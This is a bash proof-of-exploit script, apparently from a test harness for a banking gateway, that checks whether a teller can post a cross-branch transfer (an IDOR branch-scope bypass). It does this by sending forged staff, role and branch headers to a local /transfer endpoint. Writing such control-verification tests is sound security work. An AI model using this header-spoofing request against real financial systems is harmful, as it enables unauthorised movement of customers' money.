#!/usr/bin/env bash
set -euo pipefail
# LG-AC-001 proof-of-exploit: branch-scope bypass (IDOR). A branch-0007 teller posts against account
# 000000000077, which belongs to branch 0014. Fires (exit 0) when that cross-branch transfer is
# accepted (status=POSTED) -- only possible with home_branch_only=off. Under home_branch_only=on it is
# rejected "OUT OF BRANCH SCOPE" (inert). Needs the running stack. Env: GATEWAY_URL.

GATEWAY_URL="${GATEWAY_URL:-http://localhost:8080}"

resp="$(curl -sS -X POST "$GATEWAY_URL/transfer" -H 'content-type: application/json' \
  -H 'X-Staff-Id: TLR001' -H 'X-Role: TELLER' -H 'X-Branch: 0007' \
  -d '{"token":"TRIGGERTOKEN0001","from_account":"000000000077","to_account":"000000000043","amount":"100.00","currency":"USD","requested_by":"0000000007"}')"

status="$(python3 -c 'import sys,json; print(json.load(sys.stdin).get("status"))' <<<"$resp")"

if [ "$status" = "POSTED" ]; then
  echo "LG-AC-001 FIRED: cross-branch transfer POSTED -> $resp"
  exit 0
fi
echo "LG-AC-001 not fired (branch scope enforced): $resp" >&2
exit 1
